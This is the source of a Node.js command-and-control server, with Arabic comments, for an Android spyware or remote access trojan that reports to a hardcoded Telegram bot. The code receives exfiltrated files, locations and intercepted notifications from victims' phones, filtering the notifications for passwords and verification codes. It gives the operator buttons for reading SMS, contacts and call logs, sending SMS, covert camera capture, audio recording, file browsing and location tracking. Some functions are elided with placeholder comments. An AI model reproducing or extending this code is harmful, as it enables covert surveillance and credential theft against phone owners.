const express = require('express');
const WebSocket = require('ws'); 
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');

const token = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const id = '7604667042';

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const bot = new TelegramBot(token, {
    polling: {
        interval: 1000,
        autoStart: true,
        params: {
            timeout: 30,
            limit: 1
        }
    }
});

const clients = new Map();
const upload = multer();

app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let notificationSettings = {
    autoSend: false, // ⭐ تعطيل الإرسال التلقائي
    filterApps: []   // ⭐ تصفية التطبيقات
};

// ⭐ نظام التحكم بالإشعارات
function shouldSendNotification(appName, title, text) {
    if (!notificationSettings.autoSend) {
        return false;
    }
    
    // ⭐ تصفية التطبيقات المزعجة
    const blockedApps = ['ir.ilmili.telegraph', 'com.telegram', 'com.whatsapp'];
    if (blockedApps.includes(appName)) {
        return false;
    }
    
    // ⭐ إرسال فقط الإشعارات المهمة
    const importantKeywords = ['كلمة سر', 'رمز', 'تحذير', 'important', 'password'];
    const hasImportantKeyword = importantKeywords.some(keyword => 
        text.includes(keyword) || title.includes(keyword)
    );
    
    return hasImportantKeyword;
}

// Routes الأساسية
app.get('/', (req, res) => {
    res.send('<h1 align="center">✅ الخادم يعمل بنجاح</h1>');
});

// ⭐ تعديل استقبال النصوص مع التحكم بالإشعارات
app.post('/uploadText', (req, res) => {
    const model = req.headers.model || 'Unknown';
    const appName = req.headers.app_name || 'Unknown';
    const title = req.headers.title || '';
    const text = req.body.text || '';
    
    // ⭐ التحقق إذا كان يجب إرسال الإشعار
    if (req.headers.notification === 'true') {
        if (!shouldSendNotification(appName, title, text)) {
            console.log(`🔇 تم حجب إشعار من: ${appName}`);
            res.send('');
            return;
        }
    }
    
    // إرسال الرسالة فقط إذا كانت مهمة
    let message = `📝 رسالة من جهاز: ${model}`;
    if (appName !== 'Unknown') {
        message += `\n📱 التطبيق: ${appName}`;
    }
    if (title) {
        message += `\n📌 العنوان: ${title}`;
    }
    message += `\n📄 النص: ${text}`;
    
    sendMessageSafe(id, message);
    res.send('');
});

// استقبال الملفات
app.post('/uploadFile', upload.single('file'), (req, res) => {
    const filename = req.file.originalname;
    const model = req.headers.model || 'Unknown';
    
    bot.sendDocument(id, req.file.buffer, {
        caption: `📁 ملف من جهاز: ${model}\n📄 اسم الملف: ${filename}`
    }, { filename: filename, contentType: 'application/octet-stream' });
    
    res.send('');
});

// استقبال الموقع
app.post('/uploadLocation', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendLocation(id, req.body.lat, req.body.lon);
    sendMessageSafe(id, `📍 موقع من جهاز: ${model}`);
    res.send('');
});

// ⭐ إضافة route للتحكم في الإعدادات
app.post('/settings', (req, res) => {
    if (req.body.autoSend !== undefined) {
        notificationSettings.autoSend = req.body.autoSend;
    }
    if (req.body.filterApps) {
        notificationSettings.filterApps = req.body.filterApps;
    }
    res.json({ success: true, settings: notificationSettings });
});

// اتصال WebSocket
wss.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';
    
    ws.uuid = uuid;
    clients.set(uuid, { 
        model, 
        battery, 
        version, 
        brightness, 
        provider,
        connection: ws
    });
    
    console.log(`✅ جهاز متصل: ${model} (${uuid})`);
    
    // ⭐ إرسال إعدادات الإشعارات للجهاز عند الاتصال
    ws.send(JSON.stringify({
        type: 'settings',
        data: notificationSettings
    }));
    
    setTimeout(() => {
        sendMessageSafe(id, 
            `🆕 جهاز جديد متصل ✅\n\n` +
            `📱 الطراز: ${model}\n` +
            `🔋 البطارية: ${battery}%\n` +
            `🤖 الأندرويد: ${version}\n` +
            `📶 الشركة: ${provider}\n` +
            `🆔 الرمز: ${uuid}\n\n` +
            `🔇 وضع الإشعارات: ${notificationSettings.autoSend ? 'مفعل' : 'معطل'}`
        );
    }, 1000);
    
    ws.on('close', () => {
        console.log(`❌ جهاز انقطع: ${model}`);
        clients.delete(uuid);
    });
});

// معالجة رسائل البوت
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (chatId.toString() !== id) {
        sendMessageSafe(chatId, '❌ غير مصرح لك باستخدام هذا البوت');
        return;
    }
    
    console.log(`📩 رسالة مستخدم: ${text}`);
    
    // ⭐ أوامر التحكم بالإشعارات
    if (text === '🔇 تعطيل الإشعارات') {
        notificationSettings.autoSend = false;
        broadcastToAllDevices('disable_notifications');
        sendMessageSafe(id, '✅ تم تعطيل الإرسال التلقائي للإشعارات');
        return;
    }
    
    if (text === '🔔 تفعيل الإشعارات') {
        notificationSettings.autoSend = true;
        broadcastToAllDevices('enable_notifications');
        sendMessageSafe(id, '✅ تم تفعيل الإرسال التلقائي للإشعارات');
        return;
    }
    
    if (text === '⚙️ إعدادات الإشعارات') {
        showNotificationSettings();
        return;
    }
    
    if (msg.reply_to_message) {
        handleReplyMessage(msg);
        return;
    }
    
    handleMainCommand(msg);
});

function handleReplyMessage(msg) {
    const replyText = msg.reply_to_message.text;
    const userText = msg.text;
    
    if (!currentUuid) {
        sendMessageSafe(id, '❌ لم يتم تحديد جهاز. استخدم قائمة الأوامر أولاً');
        return;
    }
    
    if (replyText.includes('أدخل الرقم المستهدف')) {
        currentNumber = userText;
        sendMessageSafe(id, '📝 الآن أدخل نص الرسالة:', { 
            reply_markup: { force_reply: true } 
        });
        return;
    }
    
    if (replyText.includes('الآن أدخل نص الرسالة')) {
        sendToDevice(currentUuid, `sms:${currentNumber}:${userText}`);
        showMainMenu('✅ تم إرسال الرسالة النصية');
        return;
    }
    
    // ... باقي معالجة الردود
}

function handleMainCommand(msg) {
    const text = msg.text;
    
    switch(text) {
        case '/start':
            showStartMenu();
            break;
            
        case '📱 الأجهزة المتصلة':
            showConnectedDevices();
            break;
            
        case '⚙️ قائمة الأوامر':
            showCommandsList();
            break;
            
        case '🔇 تعطيل الإشعارات':
            // معالجته في الأعلى
            break;
            
        case '🔔 تفعيل الإشعارات':
            // معالجته في الأعلى
            break;
            
        case '🔄 تحديث القائمة':
            showConnectedDevices();
            break;
            
        default:
            sendMessageSafe(id, '❌ أمر غير معروف. استخدم /start للبدء');
    }
}

// ⭐ دالة لبث الأوامر لجميع الأجهزة
function broadcastToAllDevices(command) {
    clients.forEach((device, uuid) => {
        if (device.connection.readyState === WebSocket.OPEN) {
            device.connection.send(command);
        }
    });
}

// ⭐ عرض إعدادات الإشعارات
function showNotificationSettings() {
    const status = notificationSettings.autoSend ? '🟢 مفعل' : '🔴 معطل';
    const blockedApps = notificationSettings.filterApps.join(', ') || 'لا يوجد';
    
    sendMessageSafe(id,
        `⚙️ إعدادات الإشعارات:\n\n` +
        `📢 الإرسال التلقائي: ${status}\n` +
        `🚫 التطبيقات المحجوبة: ${blockedApps}\n\n` +
        `استخدم:\n` +
        `🔇 تعطيل الإشعارات - لإيقاف الإرسال التلقائي\n` +
        `🔔 تفعيل الإشعارات - لتفعيل الإرسال التلقائي`,
        {
            reply_markup: {
                keyboard: [
                    ['🔇 تعطيل الإشعارات', '🔔 تفعيل الإشعارات'],
                    ['📱 الأجهزة المتصلة', '⚙️ قائمة الأوامر']
                ],
                resize_keyboard: true
            }
        }
    );
}

// ⭐ نظام rate limiting
let lastMessageTime = 0;
const MESSAGE_DELAY = 2000;

function sendMessageSafe(chatId, text, options = {}) {
    const now = Date.now();
    const timeSinceLastMessage = now - lastMessageTime;
    
    if (timeSinceLastMessage < MESSAGE_DELAY) {
        const delay = MESSAGE_DELAY - timeSinceLastMessage;
        return new Promise((resolve) => {
            setTimeout(() => {
                lastMessageTime = Date.now();
                bot.sendMessage(chatId, text, options).then(resolve);
            }, delay);
        });
    } else {
        lastMessageTime = now;
        return bot.sendMessage(chatId, text, options);
    }
}

// باقي الدوال (showMainMenu, showStartMenu, showConnectedDevices, etc.)
// ... [نفس الدوال السابقة لكن مع إضافة أوامر التحكم بالإشعارات]

function showStartMenu() {
    sendMessageSafe(id,
        `🤖 مرحباً بك في البوت المتقدم\n\n` +
        `✅ الميزات المتوفرة:\n` +
        `📱 إدارة الأجهزة المتصلة\n` +
        `📞 سجل المكالمات والرسائل\n` +
        `📷 الكاميرا الأمامية والخلفية\n` +
        `🎤 تسجيل صوتي\n` +
        `📍 تتبع الموقع\n` +
        `📁 إدارة الملفات\n` +
        `🔇 تحكم كامل بالإشعارات\n` +
        `\n⚡ اختر من القائمة:`,
        {
            reply_markup: {
                keyboard: [
                    ['📱 الأجهزة المتصلة', '⚙️ قائمة الأوامر'],
                    ['🔇 تعطيل الإشعارات', '🔔 تفعيل الإشعارات']
                ],
                resize_keyboard: true
            }
        }
    );
}

// ... [باقي الدوال كما هي]

function showDeviceCommands(message, uuid, device) {
    const keyboard = [
        [{ text: '📊 معلومات الجهاز', callback_data: `info:${uuid}` }, { text: '📞 سجل المكالمات', callback_data: `calls:${uuid}` }],
        [{ text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` }, { text: '💬 الرسائل', callback_data: `messages:${uuid}` }],
        [{ text: '📱 إرسال رسالة', callback_data: `sms:${uuid}` }, { text: '📨 رسالة للجميع', callback_data: `sms_all:${uuid}` }],
        [{ text: '📸 كاميرا أمامية', callback_data: `camera_front:${uuid}` }, { text: '📷 كاميرا خلفية', callback_data: `camera_back:${uuid}` }],
        [{ text: '🎤 تسجيل صوتي', callback_data: `record_audio:${uuid}` }, { text: '📁 استعراض ملفات', callback_data: `files:${uuid}` }],
        [{ text: '📍 الموقع', callback_data: `location:${uuid}` }, { text: '🔔 إشعار', callback_data: `toast:${uuid}` }],
        [{ text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` }, { text: '🔊 تشغيل صوت', callback_data: `play_sound:${uuid}` }],
        [{ text: '📱 التطبيقات', callback_data: `apps:${uuid}` }],
        [{ text: '🔇 إعدادات الإشعارات', callback_data: `notification_settings:${uuid}` }]
    ];
    
    bot.editMessageText(
        `⚙️ أوامر الجهاز: 📱 ${device.model}\n🔋 ${device.battery}% | 🤖 ${device.version}`,
        {
            chat_id: message.chat.id,
            message_id: message.message_id,
            reply_markup: { inline_keyboard: keyboard }
        }
    );
}

// معالجة الأخطاء
bot.on('error', (error) => {
    console.error('❌ خطأ في البوت:', error);
});

bot.on('polling_error', (error) => {
    console.error('❌ خطأ في الاتصال:', error);
});

// بدء الخادم
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
    console.log('🤖 البوت جاهز لاستقبال الأجهزة...');
    console.log('🔇 وضع الإشعارات: ' + (notificationSettings.autoSend ? 'مفعل' : 'معطل'));
});
